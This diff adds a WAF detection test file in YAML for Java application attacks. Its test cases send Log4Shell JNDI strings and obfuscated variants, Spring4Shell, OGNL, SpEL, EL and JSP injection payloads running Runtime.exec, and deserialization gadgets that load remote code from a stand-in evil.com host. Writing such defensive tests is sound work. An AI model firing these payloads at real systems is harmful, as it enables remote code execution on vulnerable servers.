@@ -1,0 +1,500 @@
+meta:
+  author: "Security Engineer"
+  description: "Java Application Attacks Comprehensive"
+  enabled: true
+  name: "944-java-comprehensive.yaml"
+tests:
+  - test_id: 944100
+    desc: "Log4Shell basic payload"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/search?q=${jndi:ldap://evil.com/a}"
+        output:
+          log_contains: "jndi"
+  - test_id: 944101
+    desc: "Log4Shell obfuscated payload"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/login?username=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/a}"
+        output:
+          log_contains: "lower"
+  - test_id: 944102
+    desc: "Log4Shell via User-Agent"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "${jndi:rmi://evil.com/Exploit}"
+            Host: "localhost"
+          uri: "/"
+        output:
+          log_contains: "jndi"
+  - test_id: 944103
+    desc: "Log4Shell via X-Api-Version"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            X-Api-Version: "${jndi:dns://evil.com/a}"
+          uri: "/api"
+        output:
+          log_contains: "jndi"
+  - test_id: 944104
+    desc: "Log4Shell via Authorization header"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Authorization: "Bearer ${jndi:ldap://evil.com/Token}"
+          uri: "/secure"
+        output:
+          log_contains: "jndi"
+  - test_id: 944105
+    desc: "Spring4Shell Class Loader manipulation"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/spring"
+          data: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di"
+        output:
+          log_contains: "classLoader"
+  - test_id: 944106
+    desc: "Spring4Shell Tomcat access log configuration"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/spring2"
+          data: "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+        output:
+          log_contains: "class.module"
+  - test_id: 944107
+    desc: "OGNL injection basic math"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/struts2?name=%25%7B7*7%7D"
+        output:
+          log_contains: "7*7"
+  - test_id: 944108
+    desc: "OGNL injection java.lang.Runtime"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary"
+          uri: "/upload.action"
+          data: "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"%{(#_memberAccess['allowStaticMethodAccess']=true)(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#rt=@java.lang.Runtime@getRuntime().exec('id'))}\"\r\n\r\ntest\r\n------WebKitFormBoundary--\r\n"
+        output:
+          log_contains: "java.lang.Runtime"
+  - test_id: 944109
+    desc: "SpEL injection basic payload"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/spel?expression=T(java.lang.Runtime).getRuntime().exec('id')"
+        output:
+          log_contains: "T("
+  - test_id: 944110
+    desc: "SpEL injection string interpolation"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/spel2?q=%23%7B%27%27.getClass().forName(%27java.lang.Runtime%27).getMethods()[6].invoke(null).exec(%27id%27)%7D"
+        output:
+          log_contains: "getClass"
+  - test_id: 944111
+    desc: "Java serialized object aced0005 hex"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/octet-stream"
+          uri: "/deserialize"
+          data: "\\xac\\xed\\x00\\x05\\x73\\x72"
+        output:
+          log_contains: "ac ed 00 05"
+  - test_id: 944112
+    desc: "Java serialized object rO0AB base64"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/load?state=rO0ABXNyAA..."
+        output:
+          log_contains: "rO0AB"
+  - test_id: 944113
+    desc: "Unsafe deserialization Jackson polymporphism"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/api/config"
+          data: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/obj","autoCommit":true}'
+        output:
+          log_contains: "JdbcRowSetImpl"
+  - test_id: 944114
+    desc: "Unsafe deserialization SnakeYAML"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/yaml"
+          uri: "/yaml"
+          data: "!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://evil.com/yaml-payload.jar\"] ]] ]"
+        output:
+          log_contains: "ScriptEngineManager"
+  - test_id: 944115
+    desc: "JNDI injection RMI"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/lookup?name=rmi://evil.com/Stub"
+        output:
+          log_contains: "rmi://"
+  - test_id: 944116
+    desc: "JNDI injection LDAP"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/jndi"
+          data: "context=ldap://evil.com/class"
+        output:
+          log_contains: "ldap://"
+  - test_id: 944117
+    desc: "JNDI injection DNS"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Referer: "dns://evil.com"
+          uri: "/"
+        output:
+          log_contains: "dns://"
+  - test_id: 944118
+    desc: "EL injection applicationScope"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/el?msg=${applicationScope}"
+        output:
+          log_contains: "applicationScope"
+  - test_id: 944119
+    desc: "EL injection ScriptEngineManager"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/el2?q=${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\"id\")')}"
+        output:
+          log_contains: "ScriptEngineManager"
+  - test_id: 944120
+    desc: "JSP injection scriptlet"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/upload"
+          data: "content=<% out.println(\"test\"); %>"
+        output:
+          log_contains: "<%"
+  - test_id: 944121
+    desc: "JSP injection process execution"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/upload2"
+          data: "content=<%@ page import=\"java.util.*,java.io.*\"%> <% Process p = Runtime.getRuntime().exec(\"id\"); %>"
+        output:
+          log_contains: "Runtime.getRuntime"
+  - test_id: 944122
+    desc: "Struts2 action: prefix bypass"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/index.action?action:%25%7B%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%29%2C%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%2C%28@java.lang.Runtime@getRuntime%28%29.exec%28%22id%22%29%29%7D=test"
+        output:
+          log_contains: "action:"
+  - test_id: 944123
+    desc: "GadgetProbe DNS lookup"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/probe"
+          data: "payload=java.net.URLDNS"
+        output:
+          log_contains: "URLDNS"
+  - test_id: 944124
+    desc: "ysoserial CommonsCollections payload signature"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/octet-stream"
+          uri: "/yso"
+          data: "org.apache.commons.collections.functors.InvokerTransformer"
+        output:
+          log_contains: "InvokerTransformer"
+  - test_id: 944125
+    desc: "ysoserial Rome payload signature"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/octet-stream"
+          uri: "/yso2"
+          data: "com.sun.syndication.feed.impl.ObjectBean"
+        output:
+          log_contains: "ObjectBean"
+  - test_id: 944126
+    desc: "ysoserial Hibernate payload signature"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/octet-stream"
+          uri: "/yso3"
+          data: "org.hibernate.tuple.component.AbstractComponentTuplizer"
+        output:
+          log_contains: "Tuplizer"
+  - test_id: 944127
+    desc: "JMX exploitation pattern javax.management.loading.MLet"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/jmx?bean=javax.management.loading.MLet"
+        output:
+          log_contains: "MLet"
+  - test_id: 944128
+    desc: "Spring4Shell query parameters"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/spring3?class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
+        output:
+          log_contains: "pipeline"
+  - test_id: 944129
+    desc: "Log4Shell recursive obfuscation"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+          uri: "/log4j?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}"
+        output:
+          log_contains: "::-j"
+  - test_id: 944130
+    desc: "OGNL class.classLoader injection"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/ognl3"
+          data: "class.classLoader.URLs[0]=jar:http://evil.com/a.jar!/"
+        output:
+          log_contains: "classLoader"
+  - test_id: 944131
+    desc: "Fastjson deserialization exploit pattern"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/json"
+          uri: "/fastjson"
+          data: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}'
+        output:
+          log_contains: "JdbcRowSetImpl"
+  - test_id: 944132
+    desc: "WebLogic T3 protocol exploitation signature"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/octet-stream"
+          uri: "/weblogic"
+          data: "t3 12.2.1\nAS:255\nHL:19\n"
+        output:
+          log_contains: "t3 12"
+  - test_id: 944133
+    desc: "Spring Cloud Function SpEL injection"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            spring.cloud.function.routing-expression: "T(java.lang.Runtime).getRuntime().exec(\"id\")"
+          uri: "/functionRouter"
+          data: "test"
+        output:
+          log_contains: "routing-expression"
+  - test_id: 944134
+    desc: "Java EL injection via JSF"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0"
+            Host: "localhost"
+            Content-Type: "application/x-www-form-urlencoded"
+          uri: "/faces/view.xhtml"
+          data: "javax.faces.ViewState=#{facesContext.externalContext.response.getWriter().println(request.getSession().getId())}"
+        output:
+          log_contains: "facesContext"
